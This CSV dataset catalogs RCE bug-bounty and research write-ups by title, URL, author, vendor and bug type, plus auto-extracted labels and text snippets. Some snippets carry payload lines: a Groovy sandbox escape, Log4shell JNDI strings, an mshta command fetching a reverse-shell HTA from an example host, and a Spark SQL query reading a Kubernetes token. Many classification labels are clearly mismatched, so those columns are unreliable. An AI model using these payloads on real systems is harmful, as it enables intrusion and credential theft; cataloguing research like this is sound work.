Title,URL,Authors,Programs,Bugs,Bounty,PublicationDate,AddedDate,functionality,vulnerability_type,execution_context,attack_vector,language_or_framework,impact,technical_details
The Tale Of SSRF To RCE on .GOV Domain,https://medium.com/@tobydavenn/the-tale-of-ssrf-to-rce-on-gov-domain-191185b32b37,Tobydavenn,-,"SSRF, RCE",0,9/16/22,9/17/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Breaking Bitbucket: Pre Auth Remote Command Execution (CVE-2022-36804),https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/,Maxwell Garrett (@TheGrandPew),Atlassian,"RCE, OS command injection",0,9/14/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"for the archive API endpoint in Bitbucket. We could use our argument injection, and abuse Git’s behaviour for the <span class=""code_single-line"">--exec</span> and <span class=""code_single-line"">--remote</span> flags inside the <span class=""code_single-line"">archive</span> subcommand to ultimately achieve remote command execution, without even being authenticated to Bitbucket.The final payload for "
Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities,https://onekey.com/blog/security-advisory-netgear-routers-funjsq-vulnerabilities/,"Quentin Kaiser (@QKaiser), Mücahid Kır (@muc0ze)",Netgear,"OS command injection, RCE, MiTM",0,9/14/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Hacking Unity Games with Malicious GameObjects,https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/,Jason Kielpinski (@f2jason),Unity,"Arbitrary code execution, RCE",0,9/13/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,Payload not explicitly detailed
LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function,https://arben.sh/research/LiveHelperChat-RCE/,Arben Shala (@arbennsh),Live Helper Chat,RCE,0,9/13/22,9/26/22,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,base64(Image Header + PHP Web Shell)
How I DIDN’T get an RCE in a $200 Billion company — Bug Bounty,https://medium.com/@nynan/how-i-didnt-get-an-rce-in-a-200-billion-company-bug-bounty-377afb2fb4ec,nynan (@_nynan),-,"RCE, Components with known vulnerabilities",0,9/12/22,11/30/22,General Application Logic,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Riding The Inforail To Exploit Ivanti Avalanche  Part 2,https://www.zerodayinitiative.com/blog/2022/9/7/riding-the-inforail-to-exploit-ivanti-avalanche-part-2,Piotr Bazydło (@chudyPB),Ivanti,"RCE, Insecure deserialization, Path traversal, Authentication bypass, Unrestricted file upload, Arbitrary file write, Arbitrary file read",0,9/8/21,9/15/22,Imports/Sharing,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"objects by calling config.getPayload. At [3], the code iterates over the list of PropertyPayload objects. At [4], there is a switch statement based on the property.name field. At [5], the code checks to see if property.name is equal to the string ""webfs.ac.ppk"". If so, it calls setAccessKeyPair at [6]. So, the AmcConfigDirector.processServerProfile method can be used to control the pkk value. Fina"
Groovy Template Engine Exploitation – Notes from a real case scenario,https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/,Gianluca Baldi (@0x_nope),-,"RCE, Code injection",0,9/7/22,9/20/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"seemed very promising, since it used very basic Groovy syntax and did not require any exotic library: @groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})  def x The payload “as is” did not work (of course!) because in our specific scenario it required an import, easily fixable with import groovy.*; . Aaaand BOOM! The sandbox was bypassed 😀  (good job welk1n ! y"
SATisfying our way into remote code execution in the OPC UA industrial stack,https://jfrog.com/blog/satisfying-our-way-into-remote-code-execution-in-the-opc-ua-industrial-stack/,JFrog Security Research Team (@JFrogSecurity),Unified Automation,"Memory corruption, RCE",0,8/25/22,9/15/22,Imports/Sharing,Code Injection,CI/CD Pipeline RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
Exploiting Laravel based applications with leaked APP_KEYs and Queues,https://mogwailabs.de/en/blog/2022/08/exploiting-laravel-based-applications-with-leaked-app_keys-and-queues/,Timo Müller (@mtimo44),-,RCE,0,9/7/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"to the vulnerable opcache handler: https://<vulnApp>/opcache-api/status?key=<encryptedPayload>The application will try to insecurely decrypt the attacker-controlled object.Exploiting Laravel queuesThe following exploit paths were tested on Laravel 8 and Laravel 9.2.0.By design, Laravel Queues need to temporarily store tasks and objects within an (external) queue provider. To prevent tampering at r"
Groovy Template Engine Exploitation – Notes from a real case scenario,https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/,Gianluca Baldi (@0x_nope),-,RCE,0,9/7/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"seemed very promising, since it used very basic Groovy syntax and did not require any exotic library: @groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(""whoami"")})  def x The payload “as is” did not work (of course!) because in our specific scenario it required an import, easily fixable with import groovy.*; . Aaaand BOOM! The sandbox was bypassed 😀  (good job welk1n ! y"
"CVE-2022-35405 Manage engines RCE (Password Manager Pro, PAM360 and Access Manager Plus)",https://www.bigous.me/2022/09/06/CVE-2022-35405.html,Vinicius Pereira (@big0x75),Zoho,RCE,0,9/8/22,9/15/22,General Application Logic,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
CVE-2022-34715: More Microsoft Windows NFS V4 Remote Code Execution,https://www.zerodayinitiative.com/blog/2022/8/31/cve-2022-34715-more-microsoft-windows-nfs-v4-remote-code-execution,"Quintin Crist, Dusan Stevanovic, Arimura",Microsoft,"RCE, Memory corruption",0,9/6/22,9/15/22,User Profile/Content,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Service Disruption (DoS),Payload not explicitly detailed
Hacking My Helium Crypto Miner,https://zolder.io/hacking-my-helium-crypto-miner/,Md. Asif Hossain (@0x0asif),Pycom,"Hardcoded credentials, Missing authentication, RCE, Local Privilege Escalation",0,9/5/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,to download a payload remotely:
Attacking PowerShell CLIXML Deserialization,https://www.truesec.com/hub/blog/attacking-powershell-clixml-deserialization,Alexander Andersson,Microsoft,"Insecure deserialization, RCE",0,9/13/24,9/18/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"file, with manipulated Address property We fire up Wireshark to observe the network traffic and then we deserialize the payload with Import-CliXml. import-clixml .\payload.xml Network traffic showing that the domain name lookup was triggered Cool! We can trigger arbitrary DNS requests from an untrusted data deserialization. This gadget would be the “PowerShell version” of the Java URLDNS gadget.  "
How did we Found Log4shell on Agorapulse,https://snapsec.co/blog/Log4shell-on-agorapulse/,Snap Sec (@snap_sec),Agorapulse,"Log4shell, RCE",0,9/1/22,9/15/22,File Management,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"in the profile-picture field we would use ${jndi:ldap://profilepic.<Your-Burp-Collab-URL>/a} and if we were pasting a payload in the message box we used ${jndi:ldap://inbox.<Your-Burp-Collab-URL>/a} and so on, It easily allowed us to identify the vulnerable request to trigger the vulnerability. On the other hand, we also played it safe, using a payload that was not at all harmful to the client i.e"
Bypassing ModSecurity for RCEs,https://s0md3v.github.io/blog/modsecurity-rce-bypass,Somdev Sangwan (s0md3v),ModSecurity,"WAF bypass, Code injection, RCE",0,8/29/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,that can download+execute arbitrary VBScript code. mshta http://example.com/reverseShell.hta
Blind Exploits To Rule Watchguard Firewalls,https://www.ambionics.io/blog/hacking-watchguard-firewalls,Charles Fol (@cfreal_),WatchGuard,"XPath injection, Memory corruption, Local Privilege Escalation, RCE",0,8/29/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
Out-Of-Bond Remote code Execution(RCE) on De Nederlandsche Bank N.V. with burp-suite collaborator,https://infosecwriteups.com/out-of-bond-remote-code-execution-rce-on-de-nederlandsche-bank-n-v-with-burp-suite-collaborator-2ce50260e2e4,Santosh Kumar Sha (@killmongar1996),De Nederlandsche Bank,"OS command injection, RCE",0,8/28/22,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,Payload not explicitly detailed
Tetsuji: Remote Code Execution on a GameBoy Colour 22 Years Later,https://xcellerator.github.io/posts/tetsuji/,xcellerator (@TheXcellerator),Nintendo,RCE,0,8/27/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"between the two breakpoints at $ca4f and $ca70. I guess it’s time to see it in action! Well, here we are:"
Orange Arbitrary Command Execution,https://omar0x01.medium.com/orange-arbitrary-command-execution-75ba7f283d53,Omar Hashem (@OmarHashem666),Orange,"RCE, Docker daemon misconfiguration, Missing authentication",0,9/29/22,10/2/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
How Scanning Your Projects for Security Issues Can Lead to Remote Code Execution,https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/,Ron Masas (@RonMasas),Snyk,"RCE, OS command injection",0,9/29/22,10/4/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,below; it simply opens the calculator app on macOS.
I Love Lucee: Building Lucee Extensions for Remote Code Execution,https://www.sprocketsecurity.com/resources/building-lucee-extensions-for-remote-code-execution,"Will Vandevanter, Juan Pablo Gomez Postigo",-,RCE,0,3/15/24,5/8/24,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Tale of Easy P1 Bugs in Wild,https://medium.com/@Cybervenom/tale-of-easy-p1-bugs-in-wild-1b7f5bf80eef,Harsh Tandel,-,"Forced browsing, 403 bypass, Information disclosure",0,10/1/22,10/2/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Internal Network Pivoting,Payload not explicitly detailed
Visual Studio Code Jupyter Notebook RCE,https://blog.doyensec.com/2022/10/27/jupytervscode.html,Luca Carettoni (@lucacarettoni),Microsoft,"RCE, XSS, Arbitrary file read, Electron",0,10/27/22,10/28/22,Admin/Config Panel,Command Injection,Desktop App RCE,Web Application Parameter,Java,Shell/Command Execution,"can be placed inside the malicious repository, together with the Jupyter Notebook file that triggers the XSS. After a couple of hours of trial-and-error, I discovered that we can obtain a reference of the img tag triggering the XSS by forcing the execution during the onload event."
Eat What You Kill :: Pre-authenticated Remote Code Execution in VMWare NSX Manager,https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html,"Sina Kheirkhah (@SinSinology), Steven Seeley (@steventseeley)",VMware,"RCE, Insecure deserialization, Security code review",0,10/25/22,10/28/22,Imports/Sharing,Insecure Deserialization,CI/CD Pipeline RCE,Web Application Parameter,Java,Shell/Command Execution,"unmarshalled: new ProcessBuilder().command(""calc"").start();"
Remote Code Execution by Abusing Apache Spark SQL,https://blog.stratumsecurity.com/2022/10/24/abusing-apache-spark-sql-to-get-code-execution/,Colin McQueen,-,"SQL injection, RCE",0,10/24/22,11/1/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,was built using this class and method to execute system commands. I was able to disclose their Kubernetes API token and AWS keys that had an excessive amount of permissions using the following queries: -- Read Kubernetes API token file SELECT * FROM csv.`/var/run/secrets/kubernetes.io/serviceaccount/token`
Finding Multiple Security Issues on Agorapulse,https://snapsec.co/blog/Hacking-Agorapulse/,Snap Sec (@snap_sec),Agorapulse,"Log4shell, RCE, Information disclosure, Broken Access Control, Privilege escalation",0,10/24/22,10/24/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
